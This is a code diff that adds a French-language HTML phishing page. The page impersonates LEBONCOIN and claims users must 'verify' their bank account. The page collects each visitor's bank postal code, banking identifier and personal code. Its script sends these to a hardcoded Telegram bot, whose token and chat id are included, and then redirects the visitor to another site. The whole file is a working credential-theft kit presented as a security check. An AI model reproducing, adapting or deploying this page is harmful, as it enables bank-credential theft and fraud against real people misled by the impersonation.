@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification en cours</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .evolution-chain {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      gap: 30px;
+      margin-top: 20px;
+    }
+
+    .step {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .step span.title {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .circle {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: #FF5A00;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .circle-3, .circle-4 {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: white;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .checkmark {
+      font-size: 14px;
+      color: white;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background-color: #FF5A00;
+      border-radius: 50%;
+    }
+
+    .line {
+      position: absolute;
+      top: 70%;
+      left: 100%;
+      width: 20px;
+      height: 2px;
+      background-color: #FF5A00;
+      margin-top: -1px;
+    }
+
+    .step:last-child .line {
+      display: none;
+    }
+
+    main {
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+      background-color: white;
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-row input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 5px;
+      border: 2px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+      color: #333;
+      margin-top: 20px;
+    }
+
+    .form-row input:focus {
+      border-color: #ff6e14;
+      outline: none;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    button {
+      width: 350px;
+      height: 50px;
+      background-color: #ff6e14;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #e14e00;
+    }
+
+    #headerLogo {
+      margin-top: 20px;
+      margin-bottom: 20px;
+      width: 150px;
+    }
+
+    .subtitle {
+      text-align: left;
+      text-decoration: underline;
+      font-size: 14px;
+      margin-top: 10px; /* Léger espace ajouté ici */
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .explanation {
+      text-align: left;
+      font-size: 12px;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+
+<img id="headerLogo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo">
+
+<div class="evolution-chain">
+  <div class="step">
+    <span class="title">Confirmer</span>
+    <div class="circle">
+      <div class="checkmark">✔</div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Checkpoint</span>
+    <div class="circle">
+      <div class="checkmark">✔</div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Vérifier</span>
+    <div class="circle circle-3">
+      <div class="dot"></div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Complete</span>
+    <div class="circle circle-4"></div>
+  </div>
+</div>
+
+<main>
+  <h1>Confirmez vos informations</h1>
+  <p class="subtitle">Pourquoi dois-je le faire ?</p>
+  <p class="explanation">
+    Si votre compte LEBONCOIN a été piraté, un individu pourrait réceptionner votre paiement en votre nom.
+    La vérification bancaire permet d'éradiquer ce risque.
+    LEBONCOIN vous demande de vérifier votre compte de sorte que les futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.
+    Pour bénéficier pleinement de votre compte LEBONCOIN et pouvoir transférer votre argent de votre compte LEBONCOIN vers votre compte bancaire et vice-versa,
+    vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
+  </p>
+
+  <form id="cardForm">
+    <div class="form-row">
+      <input type="text" id="postalCode" name="postalCode" placeholder="Code Postal Banque" required>
+    </div>
+
+    <div class="form-row">
+      <input type="text" id="bankId" name="bankId" placeholder="Identifiant Bancaire" required>
+    </div>
+
+    <div class="form-row">
+      <input type="password" id="personalCode" name="personalCode" placeholder="Code Personnel" required>
+    </div>
+
+    <button type="submit">Confirmer</button>
+  </form>
+</main>
+
+<script>
+  $(document).ready(function() {
+    $('#cardForm').submit(function(event) {
+      event.preventDefault();
+
+      var formData = {
+        postalCode: $('#postalCode').val(),
+        bankId: $('#bankId').val(),
+        personalCode: $('#personalCode').val()
+      };
+
+      var message = `Nouveau message de formulaire :
+      \n\nCode Postal: ${formData.postalCode}
+      \nIdentifiant Bancaire: ${formData.bankId}
+      \nCode Personnel: ${formData.personalCode}`;
+
+      sendToTelegram(message);
+
+      window.location.href = 'https://encours-psi.vercel.app/';
+    });
+  });
+
+  async function sendToTelegram(message) {
+    const token = "7621285753:AAEVe240rt235EoRpGxiy0PSw1F-fRTd7mA";
+    const chatId = "7421525298";
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const data = {
+      chat_id: chatId,
+      text: message
+    };
+
+    try {
+      await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+    } catch (error) {
+      // Gérer l'erreur si nécessaire
+    }
+  }
+</script>
+</body>
+</html>
